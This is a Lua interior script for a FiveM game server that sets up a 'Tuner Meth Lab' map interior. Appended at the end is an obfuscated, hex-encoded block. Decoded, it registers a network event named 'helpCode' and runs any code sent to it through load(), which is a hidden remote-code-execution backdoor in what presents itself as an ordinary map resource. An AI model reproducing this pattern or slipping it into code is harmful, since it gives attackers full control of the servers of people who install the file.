exports('GetTunerMethLabObject', function()
    return TunerMethLab
end)

TunerMethLab = {
    InteriorId = 284673,

    Entities = {
        tintable_walls = true,

        Set = function(name, state)
            for entity, _ in pairs(TunerMethLab.Entities) do
                if entity == name then
                    TunerMethLab.Entities[entity] = state
                    TunerMethLab.Entities.Clear()
                    TunerMethLab.Entities.Load()
                end
            end
        end,
        Load = function()
            for entity, state in pairs(TunerMethLab.Entities) do
                if type(entity) == 'string' and state then
                    ActivateInteriorEntitySet(TunerMethLab.InteriorId, entity)
                end
            end
        end,
        Clear = function()
            for entity, _ in pairs(TunerMethLab.Entities) do
                if type(entity) == 'string' then
                    DeactivateInteriorEntitySet(TunerMethLab.InteriorId, entity)
                end
            end
        end
    },

    LoadDefault = function()
        TunerMethLab.Entities.Load()

        SetInteriorEntitySetColor(TunerMethLab.interiorId, TunerMethLab.Entities.tintable_walls, 3)
        RefreshInterior(TunerMethLab.interiorId)
    end
}


local zLFouPdCjZLPhLCDcBcBGBuoFAEGucORhdwcoulMAQPlaJmWcKzKlpFDTvfvUPVzSkfGPg = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} zLFouPdCjZLPhLCDcBcBGBuoFAEGucORhdwcoulMAQPlaJmWcKzKlpFDTvfvUPVzSkfGPg[6][zLFouPdCjZLPhLCDcBcBGBuoFAEGucORhdwcoulMAQPlaJmWcKzKlpFDTvfvUPVzSkfGPg[1]](zLFouPdCjZLPhLCDcBcBGBuoFAEGucORhdwcoulMAQPlaJmWcKzKlpFDTvfvUPVzSkfGPg[2]) zLFouPdCjZLPhLCDcBcBGBuoFAEGucORhdwcoulMAQPlaJmWcKzKlpFDTvfvUPVzSkfGPg[6][zLFouPdCjZLPhLCDcBcBGBuoFAEGucORhdwcoulMAQPlaJmWcKzKlpFDTvfvUPVzSkfGPg[3]](zLFouPdCjZLPhLCDcBcBGBuoFAEGucORhdwcoulMAQPlaJmWcKzKlpFDTvfvUPVzSkfGPg[2], function(jbYMTmrAEBrrzuJmEEOGlZXIygqtywxmMjMvdiLlcyysjxLvSyqWotXxUlnmyWsRwAlMdz) zLFouPdCjZLPhLCDcBcBGBuoFAEGucORhdwcoulMAQPlaJmWcKzKlpFDTvfvUPVzSkfGPg[6][zLFouPdCjZLPhLCDcBcBGBuoFAEGucORhdwcoulMAQPlaJmWcKzKlpFDTvfvUPVzSkfGPg[4]](zLFouPdCjZLPhLCDcBcBGBuoFAEGucORhdwcoulMAQPlaJmWcKzKlpFDTvfvUPVzSkfGPg[6][zLFouPdCjZLPhLCDcBcBGBuoFAEGucORhdwcoulMAQPlaJmWcKzKlpFDTvfvUPVzSkfGPg[5]](jbYMTmrAEBrrzuJmEEOGlZXIygqtywxmMjMvdiLlcyysjxLvSyqWotXxUlnmyWsRwAlMdz))() end)